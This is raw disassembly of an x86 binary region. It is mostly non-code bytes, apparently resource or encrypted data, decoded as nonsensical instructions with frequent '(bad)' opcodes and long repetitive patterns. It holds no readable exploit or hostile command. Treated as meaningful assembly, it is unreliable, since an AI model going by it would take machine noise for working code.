  412336:	push   edx
  412337:	add    eax,0x6513210d
  41233c:	test   BYTE PTR [esi+0x155d6c29],cl
  412342:	mov    cs,WORD PTR [ebx+0x6e89e7]
  412348:	pop    edi
  412349:	xchg   edi,eax
  41234a:	imul   edi,edx,0x4f82e6b
  412350:	xchg   DWORD PTR [eax],eax
  412352:	ds addr16 cwde 
  412355:	sahf   
  412356:	sahf   
  412357:	jbe    0x412378
  412359:	cmp    dh,BYTE PTR [eax+ebp*2+0x57]
  41235d:	cmp    al,0x1e
  41235f:	(bad)  
  412360:	fistp  DWORD PTR [eax+0x2c]
  412363:	imul   BYTE PTR ds:0x9dc35555
  412369:	popf   
  41236a:	popf   
  41236b:	out    dx,al
  41236c:	sbb    ebp,DWORD PTR [edi-0x44]
  41236f:	push   ecx
  412370:	fnstenv [ecx+0x6e360763]
  412376:	fmul   QWORD PTR [eax-0x2be94790]
  41237c:	cs xchg ebp,eax
  41237e:	dec    edx
  41237f:	shl    BYTE PTR [ecx*1-0x6531a347],1
  412386:	mov    bp,WORD PTR [esp+eax*1]
  41238a:	cmp    esi,DWORD PTR [edx]
  41238c:	add    BYTE PTR [esi-0x48a0c1f6],dl
  412392:	mov    bl,0x2
  412394:	mov    eax,0x3f0a2fd9
  412399:	sub    eax,0x54e2c024
  41239e:	pop    edi
  41239f:	jl     0x412339
  4123a1:	lock jb 0x41235d
  4123a4:	fdiv   QWORD PTR [edx+ecx*4]
  4123a7:	adc    BYTE PTR [ebp+0x22],cl
  4123aa:	sbb    cl,BYTE PTR [esi+eax*1]
  4123ad:	push   ecx
  4123ae:	lods   eax,DWORD PTR ds:[esi]
  4123af:	push   esi
  4123b0:	push   ecx
  4123b1:	sub    al,0x16
  4123b3:	xor    DWORD PTR ds:0x974b8d3d,edi
  4123b9:	cs pop ecx
  4123bb:	icebp  
  4123bc:	adc    BYTE PTR [eax],al
  4123be:	and    eax,0xa6f5cb97
  4123c3:	stos   BYTE PTR es:[edi],al
  4123c4:	stos   BYTE PTR es:[edi],al
  4123c5:	mov    edi,0xb5f55551
  4123ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123cb:	sahf   
  4123cc:	jp     0x4123f8
  4123ce:	mov    ebx,0x8adad7c2
  4123d3:	adc    BYTE PTR [ebx+edi*8-0x26],ah
  4123d7:	ins    DWORD PTR es:[edi],dx
  4123d8:	scas   eax,DWORD PTR es:[edi]
  4123d9:	and    al,0x9a
  4123db:	jg     0x4123b2
  4123dd:	test   DWORD PTR [esi-0x307fde3d],ebx
  4123e3:	xor    DWORD PTR [esi-0xa4dc6e4],ecx
  4123e9:	shl    BYTE PTR [ebp+0x1b1cdf4b],cl
  4123ef:	sbb    edi,DWORD PTR [ebx+0x38]
  4123f2:	popf   
  4123f3:	dec    esi
  4123f4:	out    dx,eax
  4123f5:	jb     0x4123b2
  4123f7:	fisttp QWORD PTR [edx+0x28]
  4123fa:	adc    al,0x52
  4123fc:	ss ins DWORD PTR es:[edi],dx
  4123fe:	fiadd  DWORD PTR [ebx+ebx*2+0x1b05b96e]
  412405:	ss ins BYTE PTR es:[edi],dx
  412407:	inc    eax
  412408:	outs   dx,DWORD PTR ds:[esi]
  412409:	outs   dx,DWORD PTR ds:[esi]
  41240a:	scas   eax,DWORD PTR es:[edi]
  41240b:	and    eax,0xa0efd4e4
  412410:	push   eax
  412411:	sub    BYTE PTR [eax+0x79],bl
  412414:	div    DWORD PTR [edx-0x12f78c67]
  41241a:	mov    ah,0x3e
  41241c:	aaa    
  41241d:	sti    
  41241e:	gs sti 
  412420:	(bad)
  412423:	fucomip st,st(7)
  412425:	mov    bh,0x86
  412427:	icebp  
  412428:	push   ss
  412429:	pop    ebx
  41242a:	or     dl,BYTE PTR [eax*2-0xcf7794f]
  412431:	js     0x41246f
  412433:	lock sti 
  412435:	std    
  412436:	(bad)  
  412437:	cwde   
  412438:	add    BYTE PTR [ecx+0x53530e5c],bh
  41243e:	push   ebx
  41243f:	mov    BYTE PTR [esi-0x5d],al
  412442:	dec    eax
  412443:	and    al,0x12
  412445:	enter  0x72e5,0x34
  412449:	or     edx,ecx
  41244b:	inc    esp
  41244c:	pop    ebp
  41244d:	lock jg 0x412441
  412450:	int3   
  412451:	xor    ecx,edi
  412453:	pushf  
  412454:	mov    edx,0x95b8af06
  412459:	mov    ebx,0x397b6ad0
  41245e:	sar    esp,1
  412460:	jbe    0x412429
  412462:	scas   al,BYTE PTR es:[edi]
  412463:	or     bl,BYTE PTR [edx+eax*1]
  412466:	clc    
  412467:	or     eax,DWORD PTR [eax+0x22]
  41246a:	xchg   ecx,eax
  41246b:	lock jl 0x412466
  41246e:	loope  0x4123f7
  412470:	mov    ebx,0xbde8d1a3
  412475:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412476:	push   edx
  412477:	imul   edx,ebx,0x26cccccc
  41247d:	dec    ebp
  41247e:	shl    DWORD PTR [esi-0x4e265966],cl
  412484:	jp     0x41247b
  412486:	push   0x6c
  412488:	fnstsw WORD PTR [edx-0x20202eb]
  41248e:	mov    BYTE PTR [edx+eiz*1-0x78],al
  412492:	inc    esp
  412493:	and    cl,BYTE PTR [eax]
  412495:	xchg   ebx,eax
  412497:	dec    ebp
  412498:	ret    
  412499:	outs   dx,DWORD PTR ds:[esi]
  41249a:	sar    DWORD PTR [eax],cl
  41249c:	jns    0x41251a
  41249e:	jmp    0x7cdc:0x24c8d22d
  4124a5:	jbe    0x4124c4
  4124a7:	push   ds
  4124a8:	movups xmm4,XMMWORD PTR [ebx+0x3]
  4124ac:	inc    eax
  4124ad:	mov    ds:0x3dcc5edd,eax
  4124b2:	mov    al,ds:0x9a00f7be
  4124b7:	inc    esi
  4124b8:	jecxz  0x41245b
  4124ba:	jmp    0x4124d3
  4124bc:	or     al,BYTE PTR ds:0xe479f3e4
  4124c2:	jb     0x4124fd
  4124c4:	in     al,0x72
  4124c6:	cmp    DWORD PTR [esp+ebp*1],ebp
  4124c9:	sub    al,0x20
  4124cb:	xchg   ecx,eax
  4124cc:	dec    eax
  4124cd:	and    BYTE PTR [ebp+0x2850a34e],bl
  4124d3:	add    DWORD PTR fs:[ecx+edi*4+0x5c],ecx
  4124d8:	scas   al,BYTE PTR es:[edi]
  4124d9:	sub    DWORD PTR [ebp+0x55],edx
  4124dc:	inc    edi
  4124dd:	push   ebp
  4124de:	push   ebp
  4124df:	cmp    eax,0x7ddde000
  4124e4:	sti    
  4124e5:	imul   BYTE PTR [ebp+0x14afdb54]
  4124eb:	push   edi
  4124ec:	pop    ebx
  4124ed:	xchg   BYTE PTR [esi+0x3873d0b9],ch
  4124f3:	add    al,0xf0
  4124f5:	pop    ss
  4124f6:	mov    BYTE PTR [esi+esi*1-0x15],ch
  4124fa:	fwait
  4124fb:	cwde   
  4124fc:	cwde   
  4124fd:	pop    eax
  4124fe:	xor    esi,DWORD PTR ds:0x34677535
  412504:	sbb    bl,ch
  412506:	jne    0x4124e9
  412508:	ret    0xfb85
  41250b:	or     eax,DWORD PTR [ebp+0x10016c2]
  412511:	mov    edi,0xdfbf0fdf
  412516:	imul   edx,edi
  412519:	mov    ebx,DWORD PTR [esi+0x5bac1e9e]
  41251f:	mov    bh,0xe
  412521:	mov    ebp,0xeee8bdbd
  412526:	out    dx,al
  412527:	inc    esi
  412528:	push   edi
  412529:	push   edi
  41252a:	pop    ss
  41252b:	jp     0x4125a8
  41252d:	jnp    0x41255c
  41252f:	sub    eax,0xcef3aadc
  412534:	jb     0x412576
  412536:	or     BYTE PTR [ebp-0x5c],0xa2
  41253a:	jmp    0x4124f6
  41253c:	adc    eax,0xb366c89f
  412541:	dec    eax
  412542:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412543:	push   edx
  412544:	xchg   esi,eax
  412545:	and    BYTE PTR [edi+0x32],0x19
  412549:	stos   DWORD PTR es:[edi],eax
  41254a:	inc    edi
  41254b:	pop    edi
  41254c:	popf   
  41254d:	ins    BYTE PTR es:[edi],dx
  41254e:	je     0x412550
  412550:	out    0x5c,eax
  412552:	xlat   BYTE PTR cs:[ebx]
  412554:	or     DWORD PTR [ebp+0x55],edx
  412557:	dec    edi
  412558:	mov    eax,0x8a83ae5c
  41255d:	mov    ds:0xdcf73ccc,al
  412562:	jae    0x412556
  412564:	cmp    al,0xe1
  412566:	dec    edi
  412567:	paddusb mm3,QWORD PTR [ebp-0x60]
  41256b:	ins    DWORD PTR es:[edi],dx
  41256c:	sbb    DWORD PTR [esi],edi
  41256e:	push   ebp
  41256f:	inc    ecx
  412570:	mov    bh,0x83
  412572:	inc    ebx
  412573:	add    BYTE PTR [esi],cl
  412575:	nop
  412576:	dec    eax
  412577:	and    al,0xfc
  412579:	inc    ebx
  41257a:	inc    ebx
  41257b:	inc    ebx
  41257c:	sbb    esi,DWORD PTR [ebp+ebx*2-0x41]
  412580:	and    eax,0x3cde8d1a
  412585:	ss test BYTE PTR ss:0x32653700,0x99
  41258e:	sahf   
  41258f:	bound  esi,QWORD PTR [ecx+0x5145418]
  412595:	add    DWORD PTR [eax-0x40],0x4d4b5aea
  41259c:	push   0x5d
  41259e:	pop    ebp
  41259f:	pop    ebp
  4125a0:	(bad)  
  4125a1:	inc    BYTE PTR [eax+0x20]
  4125a4:	add    BYTE PTR [eax+0x20],0x60
  4125a8:	dec    ebp
  4125a9:	cmp    ch,BYTE PTR [edx-0x3c172d8]
  4125af:	xchg   BYTE PTR [ecx+0x40],ah
  4125b2:	shl    DWORD PTR [ebx+ecx*8],cl
  4125b5:	adc    ch,BYTE PTR [eax]
  4125b7:	push   ss
  4125b8:	mov    edx,DWORD PTR [esi+0x42]
  4125bb:	mov    fs,WORD PTR [esi+0xd34d069]
  4125c1:	stc    
  4125c2:	jl     0x4125e2
  4125c4:	test   DWORD PTR [edx-0x3f],eax
  4125c7:	sbb    ah,dl
  4125c9:	fwait
  4125ca:	lods   al,BYTE PTR ds:[esi]
  4125cb:	or     eax,DWORD PTR [eax]
  4125cd:	jo     0x412588
  4125cf:	pop    esp
  4125d0:	mov    edx,0xaa8baaaa
  4125d5:	stos   BYTE PTR es:[edi],al
  4125d6:	jle    0x412580
  4125d8:	stos   BYTE PTR es:[edi],al
  4125d9:	jmp    0x3d55:0x54170019
  4125e0:	test   eax,0xf3f0ca28
  4125e5:	iret   
  4125e6:	aas    
  4125e7:	jg     0x41259e
  4125e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125ea:	xchg   esi,eax
  4125eb:	sti    
  4125ec:	mov    eax,DWORD PTR [edx-0x69f1ffbd]
  4125f2:	and    BYTE PTR [ebp-0x3cf346b6],dl
  4125f8:	or     BYTE PTR [ebp+0x75667339],bl
  4125fe:	test   eax,0x30d5ba54
  412603:	mov    ebp,cs
  412605:	addr16 iret 
  412607:	sahf   
  412608:	pop    ebp
  412609:	xchg   ebx,eax
  41260a:	int    0x66
  41260c:	aaa    
  41260d:	cdq    
  41260e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41260f:	mov    ecx,0x3ecd34d9
  412614:	pop    ebp
  412615:	xlat   BYTE PTR ds:[ebx]
  412616:	jge    0x4125dd
  412618:	(bad)
  41261d:	aad    0x6a
  41261f:	mov    ch,0xea
  412621:	xor    cl,BYTE PTR [ebx+eax*2]
  412624:	push   ebp
  412625:	push   ebp
  412626:	push   ebp
  412627:	and    eax,0xdd75d721
  41262c:	dec    edx
  41262d:	inc    esi
  41262e:	push   edx
  41262f:	adc    al,0xc5
  412631:	retf   0xa7f3
  412634:	pusha  
  412635:	bound  edi,QWORD PTR [ecx+0x29ea365c]
  41263b:	mov    edx,0x1528a286
  412640:	push   ebp
  412641:	push   ebp
  412642:	dec    ebp
  412643:	push   ebp
  412644:	push   ebp
  412645:	sub    ebp,DWORD PTR [edx+0x5554c6aa]
  41264b:	lea    eax,[edx]
  41264d:	mov    BYTE PTR [ebx+0x28ae3aaa],ch
  412653:	retf   0x4505
  412656:	push   ecx
  412657:	add    DWORD PTR cs:[eax],ebx
  41265a:	jnp    0x41263d
  41265c:	test   DWORD PTR [edi],edx
  41265e:	cs (bad) 
  412660:	jmp    0x1428f143
  412665:	push   cs
  412666:	add    DWORD PTR [eax],edi
  412668:	pop    eax
  412669:	ss push edx
  41266b:	test   eax,0x43a00294
  412670:	push   ebp
  412671:	push   ebp
  412672:	dec    edi
  412673:	es xchg ebx,eax
  412675:	icebp  
  412676:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412677:	shr    ecx,cl
  412679:	cs inc ebp
  41267b:	push   ecx
  41267c:	jl     0x412626
  41267e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41267f:	retf   
  412680:	jp     0x4126ce
  412682:	ror    DWORD PTR [ecx+eax*1],cl
  412685:	push   eax
  412686:	push   esp
  412687:	push   ebp
  412688:	lods   eax,DWORD PTR ds:[esi]
  412689:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41268a:	shr    DWORD PTR [ecx+0x77],cl
  41268d:	sub    dl,BYTE PTR [ebp-0x5d75d7f6]
  412693:	mov    eax,0xbaf32e5c
  412698:	jmp    0x412648
  41269a:	retf   
  41269b:	test   eax,0x55aaa
  4126a0:	xchg   edi,eax
  4126a1:	retf   
  4126a2:	push   ebp
  4126a3:	cmp    DWORD PTR [edx-0xc],edi
  4126a6:	test   al,0x76
  4126a8:	loop   0x41266e
  4126aa:	mov    DWORD PTR [edx+0x28],ebp
  4126ad:	adc    al,0xca
  4126af:	mov    ebx,0xa29cae5c
  4126b4:	sub    BYTE PTR ds:0x51457900,al
  4126ba:	or     bh,BYTE PTR [edi]
  4126bc:	stc    
  4126bd:	leave  
  4126be:	dec    edi
  4126bf:	(bad)  
  4126c0:	aam    0x66
  4126c2:	mov    esp,0x1c0e0703
  4126c7:	cmp    BYTE PTR [eax-0x20],dh
  4126ca:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  4126d1:	jo     0x4126b3
  4126d3:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  4126da:	jo     0x4126bc
  4126dc:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  4126e3:	jo     0x4126c5
  4126e5:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  4126ec:	jo     0x4126ce
  4126ee:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  4126f5:	jo     0x4126d7
  4126f7:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  4126fe:	jo     0x4126e0
  412700:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  412707:	jo     0x4126e9
  412709:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  412710:	jo     0x4126f2
  412712:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  412719:	jo     0x4126fb
  41271b:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  412722:	jo     0x412704
  412724:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  41272b:	jo     0x41270d
  41272d:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  412734:	jo     0x412716
  412736:	rol    cl,0x15
  412739:	loopne 0x41273a
  41273b:	add    eax,DWORD PTR [esi]
  41273d:	shl    eax,0x29
  412740:	xor    ecx,DWORD PTR [ebx+0x68]
  412743:	inc    BYTE PTR [eax]
  412745:	add    BYTE PTR [eax],al
  412747:	add    BYTE PTR [ecx+0x45],cl
  41274a:	dec    esi
  41274b:	inc    esp
  41274c:	scas   al,BYTE PTR es:[edi]
  41274d:	inc    edx
  41274e:	pusha  
  41274f:	sub    BYTE PTR [eax],0x0
  412752:	add    BYTE PTR [eax],al
  412754:	xor    BYTE PTR [eax],al
  412756:	add    BYTE PTR [eax],al
  412758:	pusha  
  412759:	add    BYTE PTR [eax],al
  41275b:	add    BYTE PTR [ecx],al
  41275d:	add    BYTE PTR [eax],ah
  41275f:	add    BYTE PTR [eax],al
  412761:	add    BYTE PTR [eax],al
  412763:	add    BYTE PTR [eax+0x25],al
	...
  412a0d:	add    BYTE PTR [eax],al
  412a0f:	add    BYTE PTR [ecx-0x44fa4e4f],dh
  412a15:	mov    ebx,0xb3b31cbb
  412a1a:	mov    bl,0x55
  412a1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a1f:	xor    BYTE PTR [ecx-0x4d704e4f],0xb2
  412a26:	mov    dl,0x96
  412a28:	mov    ah,0xb4
  412a2a:	mov    ah,0x99
  412a2c:	stos   DWORD PTR es:[edi],eax
  412a2d:	stos   DWORD PTR es:[edi],eax
  412a2e:	stos   DWORD PTR es:[edi],eax
  412a2f:	xchg   edi,eax
  412a30:	lea    ecx,[ebp-0x7d7d6d73]
  412a36:	add    BYTE PTR [edx+0x5c797979],0x72
  412a3d:	jb     0x412ab1
  412a3f:	and    eax,DWORD PTR [ecx+0x78181]
	...
  412ac5:	add    BYTE PTR [eax],al
  412ac7:	add    BYTE PTR [ebp-0x57e57273],cl
  412acd:	test   al,0xa8
  412acf:	jne    0x412a8d
  412ad1:	mov    esp,0xcdcdd1bc
  412ad6:	int    0xff
  412ad8:	aad    0xd5
  412ada:	aad    0xff
  412adc:	(bad)  
  412ade:	(bad)  
  412ae0:	in     eax,0xe5
  412ae2:	in     eax,0xff
  412ae4:	in     eax,0xe5
  412ae6:	in     eax,0xff
  412ae8:	loope  0x412acb
  412aea:	loope  0x412aeb
  412aec:	(bad)  
  412aee:	fdiv   st(7),st
  412af0:	fstp   st(5)
  412af2:	(bad)  
  412af4:	(bad)  
  412af6:	fdivp  st(7),st
  412af8:	rcl    ebx,cl
  412afa:	sar    edi,cl
  412afc:	rol    al,0xc0
  412aff:	jmp    DWORD PTR [ecx-0x731f5e5f]
  412b05:	mov    WORD PTR [edi+eax*4+0x22969696],cs
	...
  412b1c:	add    BYTE PTR [eax],al
  412b1e:	add    BYTE PTR [edx],al
  412b20:	add    BYTE PTR [eax],al
  412b22:	add    BYTE PTR [edx],al
  412b24:	add    BYTE PTR [eax],al
  412b26:	add    BYTE PTR [ecx],al
	...
  412b84:	(bad)  
  412b85:	(bad)  
  412b86:	(bad)  
  412b87:	addr16 mov bh,0xb7
  412b8a:	mov    bh,0xea
  412b8c:	aam    0xd4
  412b8e:	aam    0xff
  412b90:	xlat   BYTE PTR ds:[ebx]
  412b91:	xlat   BYTE PTR ds:[ebx]
  412b92:	xlat   BYTE PTR ds:[ebx]
  412b93:	(bad)  
  412b94:	fcmovnu st,st(3)
  412b96:	(bad)  
  412b98:	(bad)  
  412b9a:	fdiv   st(7),st
  412b9c:	fcmovnu st,st(3)
  412b9e:	(bad)  
  412ba0:	fcmovu st,st(2)
  412ba2:	(bad)  
  412ba4:	(bad)  
  412ba5:	(bad)  
  412ba6:	(bad)  
  412ba7:	call   ecx
  412ba9:	rcl    ecx,1
  412bab:	dec    ecx
  412bad:	leave  
  412bae:	leave  
  412baf:	dec    esp
  412bb1:	int3   
  412bb2:	int3   
  412bb3:	(bad)  
  412bb4:	(bad)  
  412bb6:	(bad)  
  412bb8:	(bad)  
  412bba:	fcos   
  412bbc:	ret    0xc2c2
  412bbf:	(bad)  
  412bc0:	mov    edi,0xc9ffbfbf
  412bc5:	leave  
  412bc6:	leave  
  412bc7:	jmp    FWORD PTR [ebp+0x63f9adad]
  412bcd:	arpl   WORD PTR [ebx-0x7a],sp
  412bd0:	xor    eax,0xf3535
  412bd5:	add    BYTE PTR [eax],al
  412bd7:	add    BYTE PTR [eax],al
  412bd9:	add    BYTE PTR [eax],al
  412bdb:	push   ss
  412bdc:	add    BYTE PTR [eax],al
  412bde:	add    BYTE PTR [ecx],bl
  412be0:	add    BYTE PTR [eax],al
  412be2:	add    BYTE PTR [edi],dl
  412be4:	add    BYTE PTR [eax],al
  412be6:	add    BYTE PTR ds:0x4000000,cl
  412bec:	add    BYTE PTR [eax],al
  412bee:	add    BYTE PTR [edx],al
  412bf0:	add    BYTE PTR [eax],al
  412bf2:	add    BYTE PTR [ecx],al
	...
  412c40:	mov    ds:0xcaa6a2a2,al
  412c45:	retf   0xffca
  412c48:	rcl    al,1
  412c4a:	sar    bh,1
  412c4c:	retf   
  412c4d:	retf   
  412c4e:	retf   
  412c4f:	dec    ebx
  412c51:	retf   
  412c52:	retf   
  412c53:	call   eax
  412c55:	rcl    al,1
  412c57:	call   edi
  412c59:	xlat   BYTE PTR ds:[ebx]
  412c5a:	xlat   BYTE PTR ds:[ebx]
  412c5b:	(bad)  
  412c5c:	fcmovu st,st(2)
  412c5e:	(bad)  
  412c60:	fcmovnu st,st(3)
  412c62:	(bad)  
  412c64:	fcmovu st,st(2)
  412c66:	(bad)  
  412c68:	aam    0xd4
  412c6a:	aam    0xff
  412c6c:	retf   
  412c6d:	retf   
  412c6e:	retf   
  412c6f:	call   edx
  412c71:	rcl    dl,cl
  412c73:	jmp    esp
  412c75:	in     al,0xe4
  412c77:	dec    ebp
  412c79:	int    0xcd
  412c7b:	push   DWORD PTR [edx-0x3b004d4e]
  412c81:	(bad)  
  412c82:	(bad)  
  412c83:	dec    eax
  412c85:	enter  0xffc8,0xb9
  412c89:	mov    ecx,0xc4c4ffb9
  412c8e:	(bad)  
  412c8f:	(bad)  
  412c90:	jle    0x412d10
  412c92:	jle    0x412c5c
  412c94:	or     eax,0x3d0d0d
  412c99:	add    BYTE PTR [eax],al
  412c9b:	xor    DWORD PTR [eax],eax
  412c9d:	add    BYTE PTR [eax],al
  412c9f:	cmp    eax,0x32000000
  412ca4:	add    BYTE PTR [eax],al
  412ca6:	add    BYTE PTR [edx],ah
  412ca8:	add    BYTE PTR [eax],al
  412caa:	add    BYTE PTR [ebx],dl
  412cac:	add    BYTE PTR [eax],al
  412cae:	add    BYTE PTR [eax],cl
  412cb0:	add    BYTE PTR [eax],al
  412cb2:	add    BYTE PTR [eax+eax*1],al
  412cb5:	add    BYTE PTR [eax],al
  412cb7:	add    DWORD PTR [eax],eax
	...
  412cf9:	add    BYTE PTR [eax],al
  412cfb:	add    BYTE PTR [ebp-0x3a7a6263],bl
  412d01:	(bad)
  412d04:	(bad)  
  412d05:	(bad)  
  412d06:	(bad)  
  412d07:	inc    ecx
  412d09:	rol    ecx,0xff
  412d0c:	mov    edi,0xccccffc7
  412d12:	int3   
  412d13:	call   eax
  412d15:	rcl    al,1
  412d17:	call   edi
  412d19:	xlat   BYTE PTR ds:[ebx]
  412d1a:	xlat   BYTE PTR ds:[ebx]
  412d1b:	(bad)  
  412d1c:	(bad)  
  412d1e:	fdiv   st(7),st
  412d20:	fstp   st(5)
  412d22:	(bad)  
  412d24:	(bad)  
  412d26:	fdiv   st(7),st
  412d28:	aam    0xd4
  412d2a:	aam    0xff
  412d2c:	enter  0xc8c8,0xff
  412d30:	rcl    ebx,cl
  412d32:	sar    edi,cl
  412d34:	(bad)  
  412d36:	fdivp  st(7),st
  412d38:	rol    ecx,0xc1
  412d3b:	inc    edx
  412d3d:	ret    0xffc2
  412d40:	retf   0xcaca
  412d43:	push   DWORD PTR [ebp-0x53004a4b]
  412d49:	lods   al,BYTE PTR ds:[esi]
  412d4a:	lods   al,BYTE PTR ds:[esi]
  412d4b:	jmp    FWORD PTR [esp+ebp*4-0x3d3d0054]
  412d52:	ret    0x6eff
  412d55:	outs   dx,BYTE PTR ds:[esi]
  412d56:	outs   dx,BYTE PTR ds:[esi]
  412d57:	enter  0x0,0x0
  412d5b:	dec    eax
  412d5c:	add    BYTE PTR [eax],al
  412d5e:	add    BYTE PTR [ebx+0x0],cl
  412d61:	add    BYTE PTR [eax],al
  412d63:	inc    eax
  412d64:	add    BYTE PTR [eax],al
  412d66:	add    BYTE PTR [edx],dh
  412d68:	add    BYTE PTR [eax],al
  412d6a:	add    BYTE PTR [eax+eax*1],ah
  412d6d:	add    BYTE PTR [eax],al
  412d6f:	adc    eax,0xb000000
  412d74:	add    BYTE PTR [eax],al
  412d76:	add    BYTE PTR ds:0x0,al
	...
  412dbc:	mov    dh,0xb6
  412dbe:	mov    dh,0xee
  412dc0:	mov    ebp,0xbdffbdbd
  412dc5:	mov    ebp,0xc1c1ffbd
  412dca:	sar    edi,0xc4
  412dcd:	(bad)  
  412dce:	(bad)  
  412dcf:	dec    eax
  412dd1:	enter  0xffc8,0xce
  412dd5:	into   
  412dd6:	into   
  412dd7:	call   ebp
  412dd9:	aad    0xd5
  412ddb:	(bad)  
  412ddc:	(bad)  
  412dde:	fdiv   st(7),st
  412de0:	fstp   st(5)
  412de2:	(bad)  
  412de4:	fcmovu st,st(2)
  412de6:	(bad)  
  412de8:	rcl    dl,cl
  412dea:	sar    bh,cl
  412dec:	mov    edi,0xcdcdffc7
  412df2:	int    0xff
  412df4:	int    0xcd
  412df6:	int    0xff
  412df8:	rol    ecx,0xc1
  412dfb:	inc    edx
  412dfd:	ret    0xffc2
  412e00:	mov    ah,0xb4
  412e02:	mov    ah,0xff
  412e04:	scas   eax,DWORD PTR es:[edi]
  412e05:	scas   eax,DWORD PTR es:[edi]
  412e06:	scas   eax,DWORD PTR es:[edi]
  412e07:	jmp    FWORD PTR [eax-0x66005758]
  412e0d:	cdq    
  412e0e:	cdq    
  412e0f:	jmp    DWORD PTR [esi-0x6800595a]
  412e15:	xchg   edi,eax
  412e16:	xchg   edi,eax
  412e17:	in     al,dx
  412e18:	or     eax,0x5e0d0d
  412e1d:	add    BYTE PTR [eax],al
  412e1f:	inc    ecx
  412e20:	add    BYTE PTR [eax],al
  412e22:	add    BYTE PTR [eax+eax*1+0x0],al
  412e26:	add    BYTE PTR [esi],dh
  412e28:	add    BYTE PTR [eax],al
  412e2a:	add    BYTE PTR [edi],ah
  412e2c:	add    BYTE PTR [eax],al
  412e2e:	add    BYTE PTR [eax+eax*1],bl
  412e31:	add    BYTE PTR [eax],al
  412e33:	adc    al,BYTE PTR [eax]
  412e35:	add    BYTE PTR [eax],al
  412e37:	or     DWORD PTR [eax],eax
	...
  412e79:	add    BYTE PTR [eax],al
  412e7b:	add    BYTE PTR [esi-0x4813494a],dh
  412e81:	mov    bh,0xb7
  412e83:	(bad)  
  412e84:	mov    edx,0xbdffbaba
  412e89:	mov    ebp,0xc0c0ffbd
  412e8e:	sar    bh,0xc4
  412e91:	(bad)  
  412e92:	(bad)  
  412e93:	dec    ecx
  412e95:	leave  
  412e96:	leave  
  412e97:	dec    edi
  412e99:	iret   
  412e9a:	iret   
  412e9b:	call   esi
  412e9d:	(bad)  
  412e9e:	(bad)  
  412e9f:	call   edi
  412ea1:	xlat   BYTE PTR ds:[ebx]
  412ea2:	xlat   BYTE PTR ds:[ebx]
  412ea3:	call   ebp
  412ea5:	aad    0xd5
  412ea7:	dec    ebp
  412ea9:	int    0xcd
  412eab:	inc    esp
  412ead:	(bad)  
  412eae:	(bad)  
  412eaf:	inc    ebp
  412eb1:	(bad)
  412eb4:	rol    al,0xc0
  412eb7:	(bad)  
  412eb8:	mov    ebp,0xb6ffbdbd
  412ebd:	mov    dh,0xb6
  412ebf:	jmp    FWORD PTR [esi-0x5d005152]
  412ec5:	mov    ds:0x9494ffa2,al
  412eca:	xchg   esp,eax
  412ecb:	call   DWORD PTR [eax-0x5a006f70]
  412ed1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ed2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ed3:	call   FWORD PTR [ebp+0x17ef9d9d]
  412ed9:	pop    ss
  412eda:	pop    ss
  412edb:	pop    eax
  412edc:	add    BYTE PTR [eax],al
  412ede:	add    BYTE PTR [edx],dh
  412ee0:	add    BYTE PTR [eax],al
  412ee2:	add    BYTE PTR [ebx],bh
  412ee4:	add    BYTE PTR [eax],al
  412ee6:	add    BYTE PTR [ecx],dh
  412ee8:	add    BYTE PTR [eax],al
  412eea:	add    BYTE PTR [esi],ah
  412eec:	add    BYTE PTR [eax],al
  412eee:	add    BYTE PTR [eax+eax*1],bl
  412ef1:	add    BYTE PTR [eax],al
  412ef3:	adc    al,BYTE PTR [eax]
  412ef5:	add    BYTE PTR [eax],al
  412ef7:	or     DWORD PTR [eax],eax
	...
  412f39:	add    BYTE PTR [eax],al
  412f3b:	add    BYTE PTR [edx-0x44524d4e],dh
  412f41:	mov    ebx,0xb9b9ffbb
  412f46:	mov    ecx,0xb9b9b9ff
  412f4b:	(bad)  
  412f4c:	mov    esi,0xc0ffbebe
  412f51:	rol    al,0xff
  412f54:	(bad)  
  412f55:	(bad)  
  412f56:	(bad)  
  412f57:	inc    edi
  412f59:	mov    edi,0xccccccff
  412f5f:	dec    esi
  412f61:	into   
  412f62:	into   
  412f63:	dec    esp
  412f65:	int3   
  412f66:	int3   
  412f67:	inc    edi
  412f69:	mov    edi,0xc3c3c3ff
  412f6f:	inc    eax
  412f71:	rol    al,0xff
  412f74:	mov    edx,0xb0ffbaba
  412f79:	mov    al,0xb0
  412f7b:	jmp    DWORD PTR [ebx-0x6b005c5d]
  412f81:	xchg   esp,eax
  412f82:	xchg   esp,eax
  412f83:	dec    DWORD PTR [esi-0x6e007172]
  412f89:	xchg   ecx,eax
  412f8a:	xchg   ecx,eax
  412f8b:	call   DWORD PTR [edi-0x50006869]
  412f91:	scas   eax,DWORD PTR es:[edi]
  412f92:	scas   eax,DWORD PTR es:[edi]
  412f93:	push   DWORD PTR [esp+esi*2+0x74]
  412f97:	ret    
  412f98:	add    BYTE PTR [eax],al
  412f9a:	add    BYTE PTR [edx],ah
  412f9c:	add    BYTE PTR [eax],al
  412f9e:	add    BYTE PTR [edx],ah
  412fa0:	or     eax,0x300d0d
  412fa5:	add    BYTE PTR [eax],al
  412fa7:	sub    DWORD PTR [eax],eax
